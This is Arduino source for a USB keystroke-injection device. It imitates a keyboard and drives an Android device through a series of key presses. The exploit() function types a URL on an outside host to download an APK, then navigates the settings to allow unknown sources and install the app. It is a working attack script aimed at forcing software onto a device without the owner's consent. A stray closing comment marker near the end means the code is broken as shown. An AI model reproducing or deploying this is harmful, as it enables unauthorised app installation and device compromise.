uint8_t buf[8] = { 
  0 }; 	/* Keyboard report buffer */
 
void setup() 
{
  Serial.begin(9600);
  randomSeed(analogRead(0));
  delay(200);
}
 
void loop() 
{
  exploit();
  while (42) {}
}
 
void sendKey(int key) 
{
  buf[2] = key;
  Serial.write(buf, 8);
  buf[0] = 0;
  buf[2] = 0;
  Serial.write(buf, 8);	// Release key  
}

void sendStr(char *string)
{
  for (int i=0; i < strlen(string); i++)
    sendKey(string[i]-93);
}

void down()
{
  delay(100);
  sendKey(81);
}

void up()
{
  delay(100);
  sendKey(82);
}

void left()
{
  delay(100);
  sendKey(80);
}

void right()
{
  delay(100);
  sendKey(79);
}

void clic()
{
  delay(100);
  sendKey(40);
}

void back()
{
  delay(100);
  sendKey(41);
}

void goHome()
{
  for (int i=0; i < 30; i++) {
    delay(100);
    sendKey(41);
  }
  //buf[0]=226; //leftAlt
  //sendKey(41); //esc
  //sendKey(74);   
}

void exploit()
{
  delay(700);
  sendKey(44); //space
  delay(200);
  sendKey(44);delay(200);
  sendKey(44);delay(200);
  sendKey(44);
  
  delay(500);
  
  goHome();
  //sendKey(3); //home (idk how though)
  
  delay(100);
  
  sendStr("http");
  sendKey(203); //:
  sendKey(56); // /
  sendKey(56);
  sendStr("perihelion");
  sendKey(55); //.
  sendStr("io");
  sendKey(56); // /
  sendStr("takecharge");
  sendKey(55);
  sendStr("apk");  
  
  clic();
  
  delay(600);
  
  right();
  right();
  clic();
  
  //now download started
  
  //uninown sources
  
  delay(150);
  
  sendStr("settings");
  
  for (int i=0; i < 4; i++)
    down();
  left();
  clic();
  
  for (int i=0; i < 16; i++)
    down();
  clic();
  
  //now in security, go to unknown sources
  
  for (int i=0; i < 13; i++)
    down();
  clic();
  
  back();
  
  for (int i=0; i < 30; i++)
    down();
  clic();
   
  for (int i=0; i < 15; i++)
    down();
  up();
  clic();
  
  for (int i=0; i < 8; i++)
    clic();
    
  back();
  
  for (int i=0; i < 30; i++)
    down();
  up();
  clic();
  
  up();
  clic();
  
  delay(100);
  
  right();
  right();
  right();
  clic();
  
  down();
  
  for (int i=0; i<5; i++)
    down();
  clic();
  
  right();
  right();
  clic();*/
  
}
